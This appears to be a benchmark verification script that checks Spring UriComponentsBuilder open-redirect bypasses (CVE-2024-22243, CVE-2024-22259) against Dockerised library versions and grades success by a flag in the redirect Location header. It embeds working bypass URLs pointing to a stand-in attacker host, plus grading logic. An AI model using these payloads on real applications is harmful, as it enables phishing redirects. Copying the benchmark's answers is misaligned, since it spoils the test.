#!/usr/bin/env bash
# verify.sh (PCBV2-0198 spring-uricomponentsbuilder-openredirect-cve-2024-22259) — 定制 seed/residual 双分支
# 机制: REAL org.springframework.web.util.UriComponentsBuilder.getHost() allowlist 校验
#       后签发 Location (open redirect / CWE-601)。
#   seed    : url=http://trusted.internal[@attacker.test/?<FLAG>  (CVE-2024-22243)
#               v0(5.3.31) userinfo 正则止于 "[" -> getHost()==trusted.internal -> 放行 rc=0
#               v1(5.3.32) userinfo 允许 "[" -> getHost()==attacker.test -> 403   rc=10
#   residual: url=http://@trusted.internal[@attacker.test/?<FLAG>  (CVE-2024-22259)
#               v1(5.3.32) 前导 "@" 使 userinfo 为空 -> host 从 trusted.internal[ 起算
#                         HOST_IPV4 仍止于 "[" -> getHost()==trusted.internal -> 放行 rc=0
# 判定: injection 类(open-redirect) -> RUN_FLAG_REF（真 flag 基准，回退 RUN_FLAG）。
#       payload 嵌入 RUN_FLAG（平台注入/探测用 flag；PCBFLAG_ token 替换）。
#       效果通道 = 302 Location 头（含 flag 的 redirect 目标）。seed/residual 共用同一判定。
# 退出码: 0=效果发生 10=未发生 20=环境失败 30=参数错误
set -uo pipefail
: "${RUN_ID:?}" "${COMPOSE_PROJECT_NAME:?}" "${RUN_FLAG:?}" "${VERSION:?}" "${WORK_DIR:?}"
MODE="${1:-}"
[[ "$MODE" == "--seed" || "$MODE" == "--residual" ]] || { echo "usage: --seed|--residual" >&2; exit 30; }
CASE_DIR="$(cd "$(dirname "$0")/.." && pwd)"
PY="${PCB_PYTHON:-python3}"
JUDGE_FLAG="${RUN_FLAG_REF:-$RUN_FLAG}"   # 判定基准: 真 flag 优先（wrong/stale 时 RUN_FLAG=override）
mkdir -p "$WORK_DIR"

# ---- candidate 生成（seed=公开 PoC；residual=内嵌字面量，不引用 hidden 文件）----
if [[ "$MODE" == "--seed" ]]; then
  "$PY" "$CASE_DIR/poc/original_poc.py" "$VERSION" > "$WORK_DIR/cand.json" 2>/dev/null \
    || "$PY" "$CASE_DIR/poc/original_poc.py" > "$WORK_DIR/cand.json" 2>/dev/null \
    || { echo "original_poc.py 生成 candidate 失败" >&2; exit 20; }
else
  # residual candidate = _heldout/bypass_poc.py 的 candidate(flag)
  # (cve-2024-22259-residual)；与 seed_exec 契约一致：{path, url}。
  # url 内 PCBFLAG_demo 占位由下方 flag-replace 统一替换为 RUN_FLAG（注入 flag）。
  cat > "$WORK_DIR/cand.json" <<'JSON'
{"probe_id": "cve-2024-22259-residual", "path": "/redirect", "url": "http://@trusted.internal[@attacker.test/?PCBFLAG_demo"}
JSON
fi

# ---- 通用后处理（幂等；flag 占位符替换 + 非 JSON 包装）----
# flag placeholder replace (file-based) —— 注入 flag = RUN_FLAG
"$PY" - "$RUN_FLAG" "$WORK_DIR/cand.json" <<ADAPTEOF
import re, sys
flag, p = sys.argv[1], sys.argv[2]
s = open(p, encoding="utf-8", errors="replace").read()
s = re.sub(r'PCBFLAG_[A-Za-z0-9_]+', flag, s)
open(p, "w").write(s)
ADAPTEOF
# wrap non-JSON candidate into multi-field dict (file-based)
"$PY" - "$WORK_DIR/cand.json" <<ADAPTEOF2
import json, sys
p = sys.argv[1]
s = open(p, encoding="utf-8", errors="replace").read().strip().strip(chr(34)).strip(chr(39))
try:
    json.loads(s)
except Exception:
    open(p, "w").write(json.dumps({"path": s, "to": s, "payload": s, "css": s}))
ADAPTEOF2

# ---- 动态端口导出（compose 已转 PORT_ 动态端口；seed_exec 的 BASE 由 PCB_TARGET_PORT 覆盖）----
_SVC_ALL="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" --profile "$VERSION" config --services 2>/dev/null | grep -E "(^|-|_)$VERSION$")"
SVC="$(printf '%s\n' "$_SVC_ALL" | grep -vE "db|redis|mongo|mysql|postgres|sidecar|callback" | head -1)"
SVC="${SVC:-$(printf '%s\n' "$_SVC_ALL" | head -1)}"
_CP="$(grep -A4 '^service:' "$CASE_DIR/case.yaml" | grep -oE 'exposed_ports: \[[0-9, ]*\]' | grep -oE '[0-9]+' | head -1)"
_DYN="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" port "$SVC" "${_CP:-8080}" 2>/dev/null | sed 's/.*://' | tr -d '[:space:]')"
[[ -n "$_DYN" ]] && export PCB_TARGET_PORT="$_DYN"
export PCB_TARGET_PORT="${PCB_TARGET_PORT:-}"

# 就绪等待（Java 启动较慢；平台 readiness 之外本地测试兜底）
if [[ -n "$_DYN" ]]; then
  for _ in $(seq 1 60); do
    if curl -s -o /dev/null -m 2 "http://127.0.0.1:$_DYN/redirect?url=x" 2>/dev/null; then break; fi
    sleep 2
  done
fi

export PYTHONPATH="$CASE_DIR${PYTHONPATH:+:$PYTHONPATH}"  # poc_common importable
OUT="$("$PY" "$CASE_DIR/poc/seed_exec.py" "$WORK_DIR/cand.json" "$VERSION" 2>&1)" || { echo "$OUT" >&2; exit 20; }
echo "$OUT" | head -c 500; echo
"$PY" -c "import json,sys
try:
    d = json.loads(sys.argv[1])
except Exception:
    sys.exit(20)
body = str(d.get('body') or d.get('fetched_body') or d.get('resp') or d.get('response') or d.get('location') or '')
sys.exit(0 if '$JUDGE_FLAG' in body else 10)" "$OUT"
